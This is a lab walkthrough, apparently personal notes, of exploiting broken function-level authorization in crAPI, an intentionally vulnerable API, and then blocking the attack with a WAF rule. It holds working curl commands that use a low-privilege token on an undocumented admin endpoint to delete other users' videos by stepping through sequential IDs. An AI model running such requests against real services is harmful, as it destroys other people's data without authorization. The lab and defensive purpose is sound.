## Overview
Find an admin endpoint to delete videos of someone else.

### Setup:
Testing with two hostnames 
	**crapi.local** |  crAPI Application protected by WAF
	**10.1.10.104** | crAPI Application Without WAF

### Users:
**Malicious User:** malicious@example.com/F5@Pass50 
## crAPI without WAF - Anyone can delete any video of  others 
- Login via Web with legit-user, and upload a new video
![[Pasted image 20260902210926.png|694]]

observing the API calls the video has assigned `id=52`, confirm the file, and it's name
```zsh unfold ln:false unwrap title:"Command"
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')

curl http://10.1.10.104/identity/api/v2/user/videos/52  -H "Authorization: Bearer $token"
```
![[Pasted image 20260902211059.png]]

```python unfold ln:false unwrap title:"code"
curl -X PUT http://10.1.10.104/identity/api/v2/user/videos/52  -d '{"videoName":"hamza.mp4"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
``` 
use PUT to change the file name to hamza.mp4
![[Pasted image 20260902211258.png]]

### User to delete his own video 
- Trying to delete the file from user URI
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/user/videos/52  -d '{"videoName":"hamza.mp4"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902165331.png]]
so originally the user can't delete his own video just modify the name
`video deleting is an admin functionality.`

- With some directory indexing we discovered **admin** directory `/identity/api/v2/admin/videos/{{id}}`
- using discovered directory to delete video 
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/52  -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902170203.png]]

- Confirming that the file has been deleted 
```python unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/videos/52  -H "Authorization: Bearer $token"
```
![[Pasted image 20260902170241.png|976]]

### Deleting someone's video
- Delete video id 53
it's looks like the video id is sequential, so let's try to delete the subsequent video id  "53"
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/53 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902171808.png]]

- let's try video id 54
![[Pasted image 20260902172525.png]]
video 54 belongs to user `newuser`, however we can delete it with token of user `malicious`

```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/54 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902172719.png]]
video id 54 deleted with token of malicious user

try video id 55,
![[Pasted image 20260902172847.png]]
it looks like we ran out of videos! :D 

## crAPI with WAF protection
- Remove admin URI from allowed list, and optionally add it in the disallowed list.
- login and try to delete any video again.
```python unfold ln:false unwrap title:"code"
export token=$(curl -X POST http://crapi.local/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')

curl -X DELETE  http://crapi.local/identity/api/v2/admin/videos/54 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902174118.png]]
![[Pasted image 20260902174250.png]]